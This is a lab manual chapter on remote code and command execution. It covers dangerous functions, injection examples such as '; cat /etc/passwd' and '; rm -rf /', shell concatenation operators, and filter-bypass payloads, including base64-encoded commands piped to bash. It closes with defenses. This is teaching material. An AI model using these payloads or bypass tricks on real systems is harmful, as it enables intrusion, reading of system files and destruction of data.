# 💀 Lab Manual: RCE Remote Code/Command Execution

### 0. Preface
In the vulnerability world, RCE is the undisputed "king." Once remote code execution is achieved, the attacker is essentially sitting in front of the server.

*   **RCE (Remote Code Execution)**: A vulnerability that allows attackers to execute arbitrary code or commands on the target system.
*   **Core Concept**: You think users are using your feature, but they're actually using your server.

This chapter's goal: **Understand why "an input box" can become "a key."**

---

### 1. Command Injection vs Code Execution

**Command Injection**:
```
User input is concatenated into system commands for execution
Example: ping user_input → ping 127.0.0.1; cat /etc/passwd
```

**Code Execution**:
```
User input is parsed and executed as code
Example: eval(user_input) → eval("__import__('os').system('id')")
```

**Core Difference**:
- Command Injection: Calls the OS shell
- Code Execution: Executes within the application runtime

---

### 2. Common Command Injection Scenarios

**Dangerous Functions (Various Languages)**:
```java
// Java
Runtime.getRuntime().exec(userInput);

// Python
os.system(userInput)
subprocess.Popen(userInput, shell=True)

// PHP
system($userInput);
exec($userInput);
shell_exec($userInput);

// Node.js
child_process.exec(userInput);
```

**Typical Vulnerable Scenarios**:
```
Filename handling: convert image.jpg; rm -rf /
Domain checking: ping google.com; cat /etc/passwd
PDF generation: wkhtmltopdf url; id
Compression: tar -xvf file.tar; whoami
```

---

### 3. Command Concatenation Symbols

**Linux/Unix**:
```bash
; cmd1; cmd2              # Sequential execution
| cmd1 | cmd2             # Pipe
|| cmd1 || cmd2           # Execute second if first fails
&& cmd1 && cmd2           # Execute second if first succeeds
& cmd1 & cmd2             # Background execution
` `cmd` `                 # Command substitution
$() $(cmd)                # Command substitution
```

**Windows**:
```cmd
& cmd1 & cmd2             # Sequential execution
| cmd1 | cmd2             # Pipe
|| cmd1 || cmd2           # Execute second if first fails
&& cmd1 && cmd2           # Execute second if first succeeds
```

---

### 4. Code Execution Vulnerabilities

**PHP**:
```php
eval($_GET['code']);
assert($_GET['code']);
preg_replace('/e', $_GET['code'], $input);  // PHP < 5.5
```

**Python**:
```python
eval(user_input)
exec(user_input)
compile(user_input, '', 'exec')
```

**JavaScript (Node.js)**:
```javascript
eval(userInput);
new Function(userInput)();
vm.runInNewContext(userInput);
```

---

### 5. Bypass Techniques Overview

**Space Bypass**:
```bash
cat</etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd  # Tab
```

**Keyword Bypass**:
```bash
c''at /etc/passwd
c""at /etc/passwd
c\at /etc/passwd
/bin/ca? /etc/passwd
```

**Encoding Bypass**:
```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
```

---

### 6. Defense Measures

**Input Validation (Whitelist)**:
```python
ALLOWED_COMMANDS = ['status', 'version', 'help']
if user_input not in ALLOWED_COMMANDS:
    raise SecurityError("Command not allowed")
```

**Parameterized Execution**:
```python
# Dangerous
os.system(f"ping {user_input}")

# Safe
subprocess.run(['ping', '-c', '4', user_input], shell=False)
```

**Sandbox/Container Isolation**:
Execute dangerous operations in restricted environments.

**Least Privilege Principle**:
Applications should not run with root privileges.

---

### 7. Conclusion

RCE is called the "king of vulnerabilities" because it directly breaks through the application layer boundary, giving attackers system-level control.

Remember: **Never concatenate user input directly into commands or code for execution.**

---

**[Ready? Go feel the power of "controlling the server"]**
